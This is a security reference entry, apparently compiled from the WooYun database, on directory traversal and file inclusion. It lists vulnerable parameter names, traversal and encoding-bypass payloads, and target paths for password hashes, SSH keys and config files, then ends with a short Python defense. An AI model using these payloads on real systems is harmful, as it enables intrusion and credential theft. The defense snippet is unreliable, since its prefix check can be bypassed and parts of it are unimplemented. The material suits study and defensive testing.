# Web Security - File Traversal and File Inclusion

> Source: WooYun vulnerability database | split from web-file-infra.md

## 2. File Traversal and File Inclusion

### 2.1 Nature of the Vulnerability

```
User-input space -> [trust boundary fails] -> filesystem space
Core: the developer assumes "user input = filename", while the attacker exploits "user input = a path instruction"
```

### 2.2 Vulnerable-Parameter Identification

High-frequency parameter names (by frequency):

```
File-related: filename, filepath, path, file, filePath, hdfile, inputFile
Download-related: download, down, attachment, attach, doc
Read-related: read, load, get, fetch, open, input
Template-related: template, tpl, page, include, temp
Generic: url, src, dir, folder, resource, name
```

High-risk feature points (top 5):
1. File-download endpoints (27 times) - `down.php, download.jsp`
2. File-preview features (17 times) - `view.php, preview.jsp`
3. Attachment management (6 times) - `attachment.php`
4. Image loading (5 times) - `pic.php, image.jsp`
5. Log viewing (4 times) - `log.php, viewlog.jsp`

### 2.3 Directory-Traversal Payloads

Basic traversal:

```bash
../                          # Linux standard
..\..\                       # Windows standard
../../../../../../../etc/passwd
..\..\..\..\..\..\windows\win.ini
```

Encoding bypass:

```bash
# Single URL encoding
%2e%2e%2f  |  %2e%2e%5c  |  ..%2f  |  %2e%2e/

# Double URL encoding
%252e%252e%252f  |  ..%252f

# Unicode/UTF-8 overlong encoding (GlassFish-specific)
%c0%ae%c0%ae/%c0%af

# Mixed encoding
..%2f  |  %2e%2e/  |  ..%c0%af
```

Special bypasses:

```bash
# Null-byte truncation (PHP<5.3.4 / old Java versions)
../../../etc/passwd%00.jpg

# Question-mark truncation
../../../WEB-INF/web.xml%3f

# Path confusion
....//  |  ....\/  |  ..\/  |  ./../../

# Absolute-path / protocol bypass
/etc/passwd
file:///etc/passwd
file://localhost/etc/passwd
```

### 2.4 Sensitive-File-Path Quick Reference

Linux systems:

```bash
/etc/passwd                    # user list (preferred for verification)
/etc/shadow                    # password hashes
/etc/hosts                     # host mappings
/root/.ssh/id_rsa              # SSH private key
/root/.bash_history            # command history
/proc/self/environ             # process environment variables
/etc/nginx/nginx.conf          # Nginx config
/etc/my.cnf                    # MySQL config
```

Windows systems:

```bash
C:\windows\win.ini             # system config (preferred for verification)
C:\boot.ini                    # boot config (XP/2003)
C:\inetpub\wwwroot\web.config  # IIS application config
C:\windows\system32\config\sam # SAM database
```

Java Web:

```bash
WEB-INF/web.xml                         # core config (preferred for verification)
WEB-INF/classes/jdbc.properties          # database config
WEB-INF/classes/applicationContext.xml   # Spring config
WEB-INF/classes/hibernate.cfg.xml        # Hibernate config
```

PHP applications:

```bash
config.php | config.inc.php | db.php | conn.php    # common config
wp-config.php                           # WordPress
config_global.php | config_ucenter.php  # Discuz
application/config/database.php         # CodeIgniter
```

ASP.NET:

```bash
web.config                 # core config (includes connection strings)
../web.config              # parent-directory config
```

### 2.5 Defenses

```python
import os
def safe_file_access(user_input, base_dir):
    # 1. Path normalization
    full_path = os.path.normpath(os.path.join(base_dir, user_input))
    # 2. Verify it is within the allowed directory
    if not full_path.startswith(os.path.normpath(base_dir)):
        raise SecurityError("Path traversal detected")
    # 3. Whitelist the extension
    # 4. Verify the file exists
    return full_path
```

Key principles: path normalization (realpath/normpath) -> directory-boundary check -> whitelist validation -> run with least privilege

---

